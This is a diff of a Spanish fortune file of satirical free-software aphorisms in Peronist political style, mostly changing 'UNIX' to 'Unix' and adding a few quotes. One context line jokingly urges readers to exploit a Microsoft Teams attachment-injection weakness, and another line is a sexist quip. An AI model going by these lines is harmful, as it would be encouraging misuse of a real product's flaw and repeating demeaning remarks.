@@ -52,7 +52,7 @@ Marcharemos con GNU en el Linux, o con Linux en el GNU.
 %
 GNU nos da la fuerza, POSIX la cohesión.
 %
-No es que los similares a UNIX sean tan buenos. Es que los demás han sido peores.
+No es que los similares a Unix sean tan buenos. Es que los demás han sido peores.
 %
 A más bits, menos tiempo.
 %
@@ -70,7 +70,7 @@ El Software Libre es Justicia Social 2.0.
 %
 El software libre es la finalidad maquinada en el alma colectiva de la comunidad organizada. Su arquitectura define sus formas de ejecución.
 %
-Administrar UNIX es fácil. Lo difícil es Conducir una Comunidad.
+Administrar Unix es fácil. Lo difícil es Conducir una Comunidad.
 %
 El Software Libre necesita apóstoles y para ser apóstol hay que estar dispuesto a ser héroe, y solamente los fanáticos de amor por una causa son capaces de morir por un ideal.
 %
@@ -204,7 +204,7 @@ El software de GNU es un fin en sí mismo, no sólo medio. Son programas de comp
 %
 Yo divido la acción de GNU en dos vertientes: la acción administrativa (para la cual tiene un pequeño conjunto de aplicaciones en /usr/sbin), y la acción de lucha, que sucede en /usr/bin.
 %
-UNIX existía antes que GNU, pero fue GNU quien les dio el lugar que los hackers merecían por justo derecho.
+Unix existía antes que GNU, pero fue GNU quien les dio el lugar que los hackers merecían por justo derecho.
 %
 Un hacker debe ser - fundamentalmente - un amateur, aunque los hackers pueden recibir paga por su expertise.
 %
@@ -246,7 +246,7 @@ Que todo FTP tenga su ARCHIE.
 %
 Antes que Googl€ estuvo Verónica.
 %
-Antes que UNIX estuvo TENEX.
+Antes que Unix estuvo TENEX.
 %
 Antes que TENEX estuvo MULTICS.
 %
@@ -302,7 +302,7 @@ Cuando chateas no puedes ver a la gente, pero puedes inferirla.
 %
 Sin expresiones faciales, tono de voz, lenguaje corporal, ambiente físico compartido y otras pistas contextuales, las emociones pueden transmitirse a través del chat IRC usando emoticones.
 %
-El programa WRITE permite a los compañeros hospedados en máquinas UNIX diversas comunicarse pantalla a pantalla.
+El programa WRITE permite a los compañeros hospedados en máquinas Unix diversas comunicarse pantalla a pantalla.
 %
 Los sistemas de chat que permiten a un individuo enviar mensajes mecanografiados directamente al terminal de otra persona enlazada a la misma máquina se remontan a los sistemas de tiempo de cómputo compartido de la década de 1960.
 %
@@ -310,7 +310,7 @@ Gran parte del software que recibo y envío está preparado en lenguaje Python, 
 %
 Para conducir a Python, que mejor que un gestor de paquetes de facto: el pip.
 %
-Un verdadero hacker ha de poseer la habilidad para dividir su accionamiento informático en partes pequeñas comprensibles, que le avalen la realización de muchos trabajos sencillos. El total de sus realizaciones será la suma y unión de las partes. Esta es la manera en la que UNIX nos permite proyectar un futuro provechoso.
+Un verdadero hacker ha de poseer la habilidad para dividir su accionamiento informático en partes pequeñas comprensibles, que le avalen la realización de muchos trabajos sencillos. El total de sus realizaciones será la suma y unión de las partes. Esta es la manera en la que Unix nos permite proyectar un futuro provechoso.
 %
 Módem que no chilla, no conecta.
 %
@@ -330,7 +330,7 @@ A un pato se lo caza con llamador; unos graznidos realizados con este instrument
 %
 Para cazar perdiz no debemos recurrir a disparar al cielo con la escopeta esperando que la casualidad nos ayude a pegarle a algo; la técnica eficaz consiste en utilizar un perro avispado que busque en el pajonal y nos levanta la perdiz. Un LiveCD con Linux puede hacer lo mismo.
 %
-La suma de todos los beneficios sociales benefician a todos. La enseñanza de un sistema UNIX tiene también las mismas implicancias.
+La suma de todos los beneficios sociales benefician a todos. La enseñanza de un sistema Unix tiene también las mismas implicancias.
 %
 Mas que de la piratería, yo soy partidario de la libre copia.
 %
@@ -346,7 +346,7 @@ Debemos romper la tranquera del software privativo y si es necesario, cortar la 
 %
 Nuestros programadores lo han comprendido, y ustedes ya saben qué distro tienen que instalar.
 %
-Me he hecho eco de aquella vieja demanda y anhelo, en la cual todos me piden que les otorgue las herramientas más poderosas para su quehacer diario. ¡La oligarquía nunca lo hizo! Sin embargo, nuestra Doctrina avala que cada uno disponga de un potente UNIX.
+Me he hecho eco de aquella vieja demanda y anhelo, en la cual todos me piden que les otorgue las herramientas más poderosas para su quehacer diario. ¡La oligarquía nunca lo hizo! Sin embargo, nuestra Doctrina avala que cada uno disponga de un potente Unix.
 %
 Programar es un arte, y como tal tiene su técnica y tiene su teoría. Conociéndolas estas es mucho más fácil programar que ignorándolas.
 %
@@ -360,9 +360,9 @@ La CPU no es un chip. La CPU es un órgano.
 %
 El Kernel constituye el órgano de la conducción táctica. El órgano de la conducción estratégica es el Hacker.
 %
-Cuando HP hizo HP/UX y la IBM sacó AIX, supimos que la guerra UNIX estaba decidida. Porque si estos señores le quieren colgar un UNIX al mainframe, es porque no tienen ni calzón que ponerse pa' ir al baile.
+Cuando HP hizo HP/UX y la IBM sacó AIX, supimos que la guerra Unix estaba decidida. Porque si estos señores le quieren colgar un Unix al mainframe, es porque no tienen ni calzón que ponerse pa' ir al baile.
 %
-En estos tiempos, pagar una licencia de software es un crimen.
+En estos tiempos, pagar una licencia de software es un crímen.
 %
 Puntero mata web UI y justicialismo mata bigdata.
 %
@@ -380,7 +380,7 @@ A nuestro Movimiento no le venden globos. Nos ha caracterizado una sana raigambr
 %
 La responsabilidad que le cabe a los hackers no es otra que la que están llevando a la realidad en base a su esfuerzo: formarse y organizarse. Formarse para promover el progreso del kernel, y organizarse para defender el sistema compartido y lanzarse hacia el futuro bajo el signo del Software Libre.
 %
-UNIX es el bombo. Sus hackers, la manguera.
+Unix es el bombo. Sus hackers, la manguera.
 %
 ¿En qué consiste y qué es cada una de las partes del método de la programación? Primeramente especificar la situación, segundo, la apreciación de esa situación; y tercero, la resolución que surge de esa apreciación de la situación que hemos contemplado. Vale decir, que de la situación y de la apreciación (o sea del fenómeno y del análisis) fluye el código fuente.
 %
@@ -416,9 +416,9 @@ Contra sofismas y dictaduras de quienes paradójicamente se proclaman liberales 
 %
 El usuario novato poco puede hacer por el bien del sistema más que disfrutarlo. Es el admin quien debe contar con gran expertise, y su tarea fundamental es la de entender el manejo del sistema y administrarlo para el bien del Pueblo.
 %
-En los sistemas tipo UNIX podemos contar con una estructura de directorios, y los mismos pueden contener archivos. Estos normalmente son visibles y evidentes para los trabajadores.
+En los sistemas tipo Unix podemos contar con una estructura de directorios, y los mismos pueden contener archivos. Estos normalmente son visibles y evidentes para los trabajadores.
 %
-Entubar el uso de herramientas disímiles es lo que torna a un sistema UNIX poderoso. Esto es lo adecuado y también lo justo.
+Entubar el uso de herramientas disímiles es lo que torna a un sistema Unix poderoso. Esto es lo adecuado y también lo justo.
 %
 No utilizo software privativo alguno. ¡Prefiero morir de hambre antes que comer el amargo pan de la traición!
 %
@@ -452,7 +452,7 @@ Nuestra Cultura es permeable a los cambios, y desde el Martín Fierro hasta el l
 %
 De un tiempo a esta parte, se han popularizado los e-Book -libros electrónicos-, que no operan ya de forma física sino que son documentos informatizados. Estos cuentan con la ventaja de su fácil transmisión telemática, y su bajo costo.
 %
-Pocos sistemas se pueden hacer aislados: normalmente los UNIX son un kernel y cien mil aplicaciones.
+Pocos sistemas se pueden hacer aislados: normalmente los Unix son un kernel y cien mil aplicaciones.
 %
 Hay una sola forma de resolver el problema de la agitación de las masas, y ella es el verdadero software libre.
 %
@@ -514,11 +514,11 @@ El emulador le mete la mula al software.
 %
 Debemos nutrirnos del software pasado de los Compañeros que la vivieron para - en su reflejo - modificarlo y compilarlo para el futuro.
 %
-Las circunstancias de UNIX no siempre responden a los mismos designios en el tiempo, y es por ello que un programador ha de saber adaptar lo nuevo si es que quiere replicar lo viejo.
+Las circunstancias de Unix no siempre responden a los mismos designios en el tiempo, y es por ello que un programador ha de saber adaptar lo nuevo si es que quiere replicar lo viejo.
 %
 Un Verdadero Programador ha de saber responder a las auténticas necesidades de su Pueblo.
 %
-Todo usuario ha de saber darse las herramientas para UNIX por medio de la copia pero también por medio de la compilación.
+Todo usuario ha de saber darse las herramientas para Unix por medio de la copia pero también por medio de la compilación.
 %
 Ya hemos escrito el Kernel, y en condiciones mucho mas adversas, por lo cual las nuevas aplicaciones no revistarán problema alguno.
 %
@@ -552,11 +552,17 @@ Es difícil hacer caer a GNU. Sólo una impúdica conducción hará que esta bic
 %
 La potencia de cómputo avanzada sólo se desplegará con el multihilo simultáneo, el cual oficiará de nivelador capaz de sustentar un pedaleo de acción pendular entre los núcleos que componen su CPU.
 %
-Los sistemas operativos BSD no son clones, sino derivados de código abierto del UNIX de Investigación de AT&T, a su vez ancestro del UNIX System V.
+Los sistemas operativos BSD no son clones, sino derivados de código abierto del Unix de Investigación de AT&T, a su vez ancestro del Unix System V.
 %
-AT&T UNIX no es código abierto y, en sentido estricto del Derecho de autor, BSD no es UNIX en absoluto.
+AT&T Unix no es código abierto y, en sentido estricto del Derecho de autor, BSD no es Unix en absoluto.
 %
-No faltarán quienes prefieran obtener licencias de uso de UNIX en lugar de desarrollar sistemas operativos por sí mismos. A esos les damos GNU.
+No faltarán quienes prefieran obtener licencias de uso de Unix en lugar de desarrollar sistemas operativos por sí mismos. A esos les damos GNU.
+%
+Muchos hackers han creado reimplementaciones más o menos exitosas del ideal de Unix, cada una con sus nuevos adornos. Algunos de ellas desaparecen rápidamente, otras se fusionan con innovaciones similares y paralelas creadas por otros en un mutuo ataque al mismo problema.
+%
+Unix se ha ido formulado lentamente alrededor de un núcleo simple y ha adquirido una especie de complejidad y asimetría que le es orgánica, como las raíces de un árbol o las ramificaciones de una arteria coronaria.
+%
+Compender el desarrollo de Unix es cosa más de la anatomía que de la ciencia del cómputo.
 %
 Ninguna persona o empresa es dueña de BSD. Es creado y distribuido por una comunidad de colaboradores altamente cualificados y comprometidos a lo largo y ancho del mundo.
 %
@@ -602,13 +608,13 @@ Uno de los inconvenientes intrínsecos del hardware consiste en el de la obsoles
 %
 Es necesario conocer la historia para llegar a un buen puerto en cualquiera de los quehaceres que podamos emprender, y en el caso de los sistemas computados, esta también será la práctica a seguir como base para apreciar.
 %
-UNIX es minimalista, pero proyectado a la grandeza. Solamente un sistema de esta característica corresponde una comunidad como la de los hackers unidos. Los timoratos, los pobres de espíritu y los mediocres prefieren siempre los pequeños proyectos como Window$.
+Unix es minimalista, pero proyectado a la grandeza. Solamente un sistema de esta característica corresponde una comunidad como la de los hackers unidos. Los timoratos, los pobres de espíritu y los mediocres prefieren siempre los pequeños proyectos como Window$.
 %
 Las comunidades organizadas como la nuestra, con grandes aspiraciones e ilusiones, deben tener también grandes sistemas operativos. GNU es uno de ellos: nada grande puede hacerse proyectando pequeñeces.
 %
 Los hackers unidos, triunfaremos.
 %
-La finalidad primordial de GNU es esencialmente social: colocar un similar a UNIX comunitario en forma que, dejando de ser privilegio de pocos, sea patrimonio de todos.
+La finalidad primordial de GNU es esencialmente social: colocar un similar a Unix comunitario en forma que, dejando de ser privilegio de pocos, sea patrimonio de todos.
 %
 Como consecuencia de la modificación del código y la distribución de copias modificadas, se elevará de manera irremediable el nivel de conocimiento de los hackers, y se dotará a toda la comunidad de un software más potente y mas digno.
 %
@@ -642,7 +648,7 @@ Ha llegado la Hora del Software Libre.
 %
 El sistema que yo encontré era un hardware económicamente prisionero, manejado desde dentro y desde fuera por las fuerzas poderosas del dinero, que es la más inhumana de las tiranías. ¡Esto ha sido corregido instalando GNU con Linux!
 %
-Lo bueno siempre quiere mejorarse, y a las buenas ideas siempre suelen tomarlas los zonzos. Estos son los que quieren dotar a una buena aplicación UNIX con chirimbolos, para hacer lo que uno no necesita.
+Lo bueno siempre quiere mejorarse, y a las buenas ideas siempre suelen tomarlas los zonzos. Estos son los que quieren dotar a una buena aplicación Unix con chirimbolos, para hacer lo que uno no necesita.
 %
 Diremos que esta unión entre el Hacker y GNU, es la que hace a la Libertad bien entendida. Asemeja a la del hardware y el software. Para que el cómputo sea libre, antes que el hardware ha de ser libre el software.
 %
@@ -702,7 +708,7 @@ Cualquiera sean los bugs que se encuentren, todos ellos están ligados de manera
 %
 Toda aplicación de Software Libre, en cualquier campo que se quiera, no será menos que beneficiosa.
 %
-Los entornos similares a UNIX están pensados bajo el paradigma Justicialista de la compartición de tiempo y recursos computacionales, y los GNU con kernel Linux confluyeron tal premisa en las PC compatibles con IBM.
+Los entornos similares a Unix están pensados bajo el paradigma Justicialista de la compartición de tiempo y recursos computacionales, y los GNU con kernel Linux confluyeron tal premisa en las PC compatibles con IBM.
 %
 La imaginación de un niño puede hacer cosas maravillosas, pero a veces el software libre puede hacer cosas más maravillosas aún.
 %
@@ -724,7 +730,7 @@ Desde sus pretendidas tarimas de Poder los oligarcas dicen quejarse por el rumbo
 %
 Alguien que programa en un sistema de usuario único no es un programador, es un tipo solo. Ha de utilizar un sistema de cómputo de tiempo compartido, pues hacker acompañado compila para la historia.
 %
-En los tiempos de Matusalén, UNIX se conducía "a pelo", y esto significaba contemplar una pantalla de fósforo ámbar o verde. Las mismas presentaban parpadeo, y efecto de fantasma por el fósforo P31 o P39 que les daba su estética característica. Hoy esto puede abarcarse con Cool-Retro-Term.
+En los tiempos de Matusalén, Unix se conducía "a pelo", y esto significaba contemplar una pantalla de fósforo ámbar o verde. Las mismas presentaban parpadeo, y efecto de fantasma por el fósforo P31 o P39 que les daba su estética característica. Hoy esto puede abarcarse con Cool-Retro-Term.
 %
 Dentro del Software Libre no somos sectarios, y hemos usado en cada tiempo las herramientas que han sido necesarias para la programación. Esta versatilidad es la que nuestros enemigos envidian, pero será también la que defina el devenir del Movimiento.
 %
@@ -754,7 +760,7 @@ No son pocas las veces en las que los más atresados programadores - aplomados y
 %
 El hacker ha de formarse para programar simplemente, a depurar por sí mismo, a sobrevivir en el mainframe. Los aplicativos de los que dispondrá serán, las más de las veces, rudimentarios.
 %
-Atrás quedarán los días en los que solo cuatro vivos vivían de lo que producían cincuenta mil programadores. Hoy, unos 150 millones de hackers se dedicarán a la producción intensiva de Software Libre en sistemas compartidos similares a UNIX.
+Atrás quedarán los días en los que solo cuatro vivos vivían de lo que producían cincuenta mil programadores. Hoy, unos 150 millones de hackers se dedicarán a la producción intensiva de Software Libre en sistemas compartidos similares a Unix.
 %
 Es esta la comunidad que nos proponemos, y así será como esos 150 programadores tendrán el software que merecen. Es eso o distribuir la CPU entre todos en partes iguales...
 %
@@ -762,7 +768,7 @@ Si bien el quehacer y la potencia de nuestra Doctrina están consolidadas en los
 %
 No todo el mundo tiene los medios en capacidad o tiempo como para desarrollar un controlador funcional. Eso es tarea del hacker.
 %
-No caben dudas para nadie que el sistema BSD se fundó sobre los despojos del sistema UNIX.
+No caben dudas para nadie que el sistema BSD se fundó sobre los despojos del sistema Unix.
 %
 Estaba este Mister Bill Gates, un hombre de pocas pulgas que no bien llegó quiso hacer en la comunidad no tanto lo que a los hackers convenía, sino lo que él mismo quería. Se planteó entonces hacer Software privado - así lo llamó - y en ese momento entre los programadores no faltaron zonzos que le hicieron el caldo.
 %
@@ -778,7 +784,7 @@ En el Justicialismo como en la informática encontramos que a veces hemos de dej
 %
 Ha de ser el hombre el material sensible, y no volcarse necesariamente a los adelantos sin darles una significancia en su alma. En la informática sucede más o menos lo mismo: no hace falta contar con el último ingenio, sino con el que nos haga feliz.
 %
-Estas clásicas terminales no han perdido su uso ni su prestigio, pues aún hoy conectándolas a través de un puerto serial Centronics RS232, es posible emplearlas como medio de entrada y salida de datos en UNIX.
+Estas clásicas terminales no han perdido su uso ni su prestigio, pues aún hoy conectándolas a través de un puerto serial Centronics RS232, es posible emplearlas como medio de entrada y salida de datos en Unix.
 %
 La Liberación del Software no es la lucha de un hacker solo, sino la de una Comunidad que se organiza compartiendo su software. Nunca podrá el hacker programar para sí. Quien así lo intentara, utilizará su código para romper sus cadenas, sólo para colgárselas a otro.
 %
@@ -790,7 +796,7 @@ Como fuera del Movimiento existen individuos que están a favor del sojuzgamient
 %
 El Movimiento del Software libre ha de tener una percepción amplia de la realidad, pues de lo contrario su destino será el de constituirse en mero peón de la historia.
 %
-Esta Guerra UNIX no ha sido para liberar a nadie, eso ya lo tenemos claro todos. Ha sido una guerra en la cual han querido decidir quién nos dominaría a nosotros.
+Esta Guerra Unix no ha sido para liberar a nadie, eso ya lo tenemos claro todos. Ha sido una guerra en la cual han querido decidir quién nos dominaría a nosotros.
 %
 Hemos dado la lucha por la liberación integral del software, y lo hemos hecho como se tiene que dar esa lucha: con todo.
 %
@@ -808,7 +814,7 @@ Del mismo modo que no puede haber una política social sin una economía organiz
 %
 Lo primero que hicimos fue otorgar políticamente a la cartera la importancia institucional que merecía el código. No podía ser que en este país tuviésemos un ministerio para las vacas, y un departamento para cuidar el software libre.
 %
-Dentro de la programación podemos encontrar a los hombres del montón y a los grandes Magos UNIX, aquellos que hacen escuela.
+Dentro de la programación podemos encontrar a los hombres del montón y a los grandes Magos Unix, aquellos que hacen escuela.
 %
 Se requiere de grandes programadores para arribar a un buen microkernel.
 %
@@ -1004,6 +1010,8 @@ Las oligarquías, desde sus madrigueras de los datos, no han cedido en sus anhel
 %
 La internet surge en el 91, pero a efectos prácticos podemos decir que influye desde una década después de esto (c.2000), cuando las masas se ven políticamente influidas por las redes de datos.
 %
+Hoy los datos no circulan sólo por el bus de la placa madre, sino que tras circunvalar por el bacheado conurbano de la red de área local, agarran por la autopista de la Lentonet, y sin pagar peaje.
+%
 El software privativo muy difícilmente sea sostenible sin someter a las enormes mayorías de una infelicidad tal que las lleve a morir de manera fraticida en busca de un futuro mejor.
 %
 Formatear es una acción dura y penosa, que no debe hacerse "a tontas y a locas" y en todo caso con sumo cuidado. Pero hasta en las mejores familias sucede.
@@ -1014,7 +1022,7 @@ En la lucha informática pueden conjugarse la denegación de servicio con la sup
 %
 Si ese tonto de Bill Gates piensa que con esta porquería nos va a parar, se equivoca pavorosamente...
 %
-Estos sistemas operativos similares a UNIX suelen contar con un programa capaz de dar arranque a los entornos residentes en disco. Esta programática - cuya funcionalidad de carga del núcleo equivale a la del "burro de arranque" de un motor a explosión - recibe el nombre de GNU Grub.
+Estos sistemas operativos similares a Unix suelen contar con un programa capaz de dar arranque a los entornos residentes en disco. Esta programática - cuya funcionalidad de carga del núcleo equivale a la del "burro de arranque" de un motor a explosión - recibe el nombre de GNU Grub.
 %
 GRUB_INIT_TUNE="900 523 4 415 2 370 2 523 4 415 2 370 2 523 4 415 4 523 4 415 2 349 2 523 4 414 2 349 2 466 4 392 4 466 4 392 2 329 2 466 4 392 2 329 2 466 4 392 4 554 4 554 2 554 2 554 4 523 2 466 2 523 4 554 2 523 2 466 2 523 2 554 2 523 2 466 2 523 4"
 %
@@ -1100,7 +1108,7 @@ Un sistema multiusuario ha de realizar armoniosamente tareas que responden a una
 %
 Nosotros estamos en la necesidad de remozar el sistema, eso que algunos llaman una actualización. Ahora bien, esto que no es demasiado drástico, suele ser - como remedio - peor que la enfermedad. Yo mas que de la actualización, soy partidario del formateo.
 %
-El sistema de archivado de UNIX tiene muchas buenas cosas, y de otras carece. Y aún así, lo que lo ha destacado ha sido su simple organización, y su orden. En él, todo es un archivo.
+El sistema de archivado de Unix tiene muchas buenas cosas, y de otras carece. Y aún así, lo que lo ha destacado ha sido su simple organización, y su orden. En él, todo es un archivo.
 %
 Lo que se ha intentado hacer con el "código abierto" no es ganar plata, sino destruir el sentido comunitario del trabajo del programador.
 %
@@ -1244,7 +1252,7 @@ Una comunidad hacker que represente una revolución trascendente, difícilmente 
 %
 Las aplicaciones evolucionan solas y cuando están imbuídas de una ideología y puestas en marcha por una doctrina de liberación, operan eficazmente.
 %
-Cuando un programador llega a Mago UNIX sabe mucho, pero no le sirve para nada; al conocimiento hay que pasárselo a quien le pueda servir. Eso es el trasvasamiento generacional del que nosotros hablamos.
+Cuando un programador llega a Mago Unix sabe mucho, pero no le sirve para nada; al conocimiento hay que pasárselo a quien le pueda servir. Eso es el trasvasamiento generacional del que nosotros hablamos.
 %
 En este momento las Comunidades Hackers están más fuertes que antes: el Movimiento del Software Libre es un Movimiento del Futuro.
 %
@@ -1300,7 +1308,7 @@ O profundizamos el uso de más cores para emprender la formidable compilación d
 %
 La grandeza del kernel y la felicidad de los hackers son dos objetivos esenciales que deben guiar nuestra programación y nuestra depuración.
 %
-Un Mago UNIX ha de tener un papel activo y relevante en toda la programación, y no debe compilar resignadamente un kernel que elaboren los demás.
+Un Mago Unix ha de tener un papel activo y relevante en toda la programación, y no debe compilar resignadamente un kernel que elaboren los demás.
 %
 Poco tiempo después Appl€ comienza a utilizar Int€l, con el Okey de Micro$oft. Si eso no es estar de acuerdo, pues lo disimulan muy bien. Son hechos que están demostrando el acuerdo, que no critico, que creo que es constructivo. Pero más constructivo es que nosotros conformemos una arquitectura abierta en la que también estemos de acuerdo.
 %
@@ -1368,7 +1376,7 @@ Con el software privativo los compañeros normalmente reciben un archivo ejecuta
 %
 Hemos de decompilar ese software privativo y liberarlo. Esas consignas que mas que mías son de la Comunidad Organizada, la defenderemos hasta el último byte.
 %
-Finalmente compañeros, les agradezco profundamente el que hayan llegado hasta este histórico UNIX. Yo llevo en mi código fuente los más maravillosos comments que son para mí las instrucciones de los hackers organizados.
+Finalmente compañeros, les agradezco profundamente el que hayan llegado hasta este histórico Unix. Yo llevo en mi código fuente los más maravillosos comments que son para mí las instrucciones de los hackers organizados.
 %
 Los magros controles de seguridad de Micro$oft Team$ permiten a terceros inyectar adjuntos a otros de sus tecno-esclavos. Aprovéchalo para liberarlos.
 %
@@ -1498,7 +1506,7 @@ Quien olvida a los hackers también olvida un poco el futuro del país.
 %
 El herramental que nos ofrece el cómputo y la telemática puede y debe contribuir a las tarea de hacer de los educandos mejores hombres, pues ellos serán los dueños del porvenir.
 %
-La formación aislada del cómputo no es pródiga en resultados. Debe plantearse con un método concienzudamente estudiado y aplicado por un mago UNIX adoctrinador, y su sapiencia ha de ser comprendida por los hackers.
+La formación aislada del cómputo no es pródiga en resultados. Debe plantearse con un método concienzudamente estudiado y aplicado por un mago Unix adoctrinador, y su sapiencia ha de ser comprendida por los hackers.
 %
 Moodle es una plataforma de software liberado bajo GPLv3 orientada a la de gestión enseñanza en línea. Permite crear sitios web privados en los cuales educadores y educandos puedan lograr sus objetivos de aprendizaje.
 %
@@ -1506,7 +1514,7 @@ Como toda instalación de servicios computados, debemos poner en funcionamiento 
 %
 Algunos dicen que en nuestros servidores formamos lo que ellos llaman "pila LAMP". Olvidan que a este servidor de GNU con Linux+web Apache+base de datos MySQL+PHP le agregamos una aguerrida doctrina para la Liberación.
 %
-El Trabajo Organizado nos hace afectos a la programación de herramientas UNIX, así como la Felicidad del Pueblo nos implica consagrarnos a la creación de juegos. La Liberación nos impone - en cambio - la compilación de potentes instrumentos para el combate telemático.
+El Trabajo Organizado nos hace afectos a la programación de herramientas Unix, así como la Felicidad del Pueblo nos implica consagrarnos a la creación de juegos. La Liberación nos impone - en cambio - la compilación de potentes instrumentos para el combate telemático.
 %
 A pesar de lo que muchos creen, el kernel es un instrumento meramente táctico, que evoluciona con la hora y que el usuario no digita. Este intervendrá en la shell, y a lo sumo traerá chizitos.
 %
@@ -1552,7 +1560,7 @@ El software libre consiste en miles de verdades, pero todas se reducen a una fra
 %
 Dividan el todo en partes conectables por caños.
 %
-En UNIX la unidad la dan los caños. En el Justicialismo, también.
+En Unix la unidad la dan los caños. En el Justicialismo, también.
 %
 El software privativo es un monstruo que hace devorar a los programadores entre sí, pero será progresivamente eliminado por quienes compilan software libre, y lo será en un futuro no muy distante.
 %
@@ -1939,83 +1947,83 @@ Un proceso consta de seis partes: vias estándar de entrada, salida y error, el 
 %
 No asocie ningún retraso que ocurra con un error del sistema, porque los comandos tardan diferentes tiempos en ejecutarse, dependiendo de su complejidad de procesamiento.
 %
-La mayoría de los procesos tienen la misma prioridad, es decir, el mismo derecho a usar la CPU, pero el sistema UNIX cuenta con herramientas que  permiten cambiar la prioridad de un proceso.
+La mayoría de los procesos tienen la misma prioridad, es decir, el mismo derecho a usar la CPU, pero el sistema Unix cuenta con herramientas que  permiten cambiar la prioridad de un proceso.
 %
 La prioridad de proceso de tiempo compartido es la clase normal de aplicaciones de usuaria.
 %
-La prioridad de proceso de tiempo real permite el uso del sistema UNIX para aplicaciones que requieren tiempos de respuesta limitados y preestablecidos.
+La prioridad de proceso de tiempo real permite el uso del sistema Unix para aplicaciones que requieren tiempos de respuesta limitados y preestablecidos.
 %
 Los procesos en tiempo real siempre obtienen el uso del tiempo de la CPU con prioridad sobre aquellos procesos de tiempo compartido.
 %
 Aumentar la prioridad del proceso generalmente resulta en una ejecución más rápida del mismo, a expensas de otros procesos presentes en memoria, que atrasarán su ejecución conforme se eleven los tiempos en que aguardan la disponibilidad de la CPU.
 %
-Si bien el sistema UNIX no establece un límite en la cantidad de procesos en segundo plano, el rendimiento del sistema tiende a degradarse ante el exceso de procesos.
+Si bien el sistema Unix no establece un límite en la cantidad de procesos en segundo plano, el rendimiento del sistema tiende a degradarse ante el exceso de procesos.
 %
 Es posible que además de usted, el Pueblo esté utilizando el sistema multiusuario desde diferentes terminales conectados a la máquina.
 %
 Los usuarios de una máquina constituyen un grupo de individuos que tienen intereses comunes, como por ejemplo, la comunicación, el intercambio de ficheros, y la Liberación.
 %
-En UNIX existe un delicado contraste entre la libertad de recorrer el sistema otorgada a las usuarias y las restricciones que se les dictan en consideración a la seguridad.
+En Unix existe un delicado contraste entre la libertad de recorrer el sistema otorgada a las usuarias y las restricciones que se les dictan en consideración a la seguridad.
 %
-El sistema UNIX proporciona herramientas eficientes para definir el estado de seguridad de los identificadores de usuaria, ficheros y programas de uso común y ficheros privados.
+El sistema Unix proporciona herramientas eficientes para definir el estado de seguridad de los identificadores de usuaria, ficheros y programas de uso común y ficheros privados.
 %
-Dado que UNIX es un sistema multitarea, muchas cosas pueden suceder en memoria simultáneamente. Una mujer es similar.
+Dado que Unix es un sistema multitarea, muchas cosas pueden suceder en memoria simultáneamente. Una mujer es similar.
 %
 El correo electrónico funciona conceptualmente como el servicio de correo tradicional: permite la comunicación entre usuarias, cada una de ellas identificada por una dirección, y cada mensaje tiene un paquete y un contenido.
 %
-En UNIX casi cualquier comando puede interrumpirse mientras espera los datos de entrada utilizando Ctrl+d.
+En Unix casi cualquier comando puede interrumpirse mientras espera los datos de entrada utilizando Ctrl+d.
 %
-En el entorno UNIX, no es posible recuperar un archivo eliminado con el comando rm. Como precaución utiliza rm -i para solicitar confirmación.
+En el entorno Unix, no es posible recuperar un archivo eliminado con el comando rm. Como precaución utiliza rm -i para solicitar confirmación.
 %
-Los comandos UNIX generalmente disponen de muchos argumentos opcionales, lo que ayuda a que el sistema sea extremadamente flexible y poderoso.
+Los comandos Unix generalmente disponen de muchos argumentos opcionales, lo que ayuda a que el sistema sea extremadamente flexible y poderoso.
 %
-Los argumentos en los comandos del sistema UNIX cumplen la misma función que en M$-DO$ y otros sistemas operativos, es decir, modificar la ejecución del comando.
+Los argumentos en los comandos del sistema Unix cumplen la misma función que en M$-DO$ y otros sistemas operativos, es decir, modificar la ejecución del comando.
 %
-El sistema UNIX cuenta con un excelente sistema de archivos para almacenar ficheros, comandos y aplicaciones.
+El sistema Unix cuenta con un excelente sistema de archivos para almacenar ficheros, comandos y aplicaciones.
 %
-Dado que UNIX es un sistema multiusuario, inmediatamente exige poder identificarte con absoluta certeza. De esta forma el sistema verifica tu intención de acceder a los archivos privados y asigna a la sesión de trabajo la prioridad que te haya sido establecida.
+Dado que Unix es un sistema multiusuario, inmediatamente exige poder identificarte con absoluta certeza. De esta forma el sistema verifica tu intención de acceder a los archivos privados y asigna a la sesión de trabajo la prioridad que te haya sido establecida.
 %
-Cada usuaria que se conecta al sistema UNIX es referenciada por un identificador (Login ID). En lugar de recurrir a tu nombre o iniciales, recurre a cualquier otra cosa para ser pseudoanónima telemáticamente.
+Cada usuaria que se conecta al sistema Unix es referenciada por un identificador (Login ID). En lugar de recurrir a tu nombre o iniciales, recurre a cualquier otra cosa para ser pseudoanónima telemáticamente.
 %
-UNIX utiliza el conjunto ASCII (American Standard Code for Information Interchange), por lo que los terminales gráficos deben tener modo ASCII.
+Unix utiliza el conjunto ASCII (American Standard Code for Information Interchange), por lo que los terminales gráficos deben tener modo ASCII.
 %
-Dado que UNIX se desarrolló originalmente para terminales teletipo, gran parte del sistema requiere que los emuladores de terminales operen en modo de caracteres.
+Dado que Unix se desarrolló originalmente para terminales teletipo, gran parte del sistema requiere que los emuladores de terminales operen en modo de caracteres.
 %
 Su terminal puede ser una consola del sistema, un terminal en modo de caracteres conectado directamente a la máquina a través de un puerto RS232, o un terminal remoto conectado a través de una línea telefónica y un módem, o incluso un terminal conectado a través de una Red de área local o ámplia.
 %
-Cuando la microcomputadora aumentó el rendimiento en términos de velocidad y potencia, al mismo tiempo que disminuyó los costos, entró en la esfera de acción del sistema UNIX.
+Cuando la microcomputadora aumentó el rendimiento en términos de velocidad y potencia, al mismo tiempo que disminuyó los costos, entró en la esfera de acción del sistema Unix.
 %
-Como reguero de pólvora, las versiones BSD y AT&T de UNIX se portaron en casi todas las computadoras capaces de admitirlas.
+Como reguero de pólvora, las versiones BSD y AT&T de Unix se portaron en casi todas las computadoras capaces de admitirlas.
 %
-Las máquinas basadas en 8088 eran casi lo suficientemente potentes como para admitir el sistema UNIX, pero solo unas pocas versiones pudieron ejecutarse en estos ordenadores.
+Las máquinas basadas en 8088 eran casi lo suficientemente potentes como para admitir el sistema Unix, pero solo unas pocas versiones pudieron ejecutarse en estos ordenadores.
 %
-Las versiones de BSD dominaron como plataforma experimental de conceptos de red, de modo que lo mejor para enlaces locales estuvo disponible en los sistemas UNIX casi inmediatamente.
+Las versiones de BSD dominaron como plataforma experimental de conceptos de red, de modo que lo mejor para enlaces locales estuvo disponible en los sistemas Unix casi inmediatamente.
 %
 El mayor experimento de red de área amplia, ARPANET, se orientó inicialmente hacia los sistemas TENEX.
 %
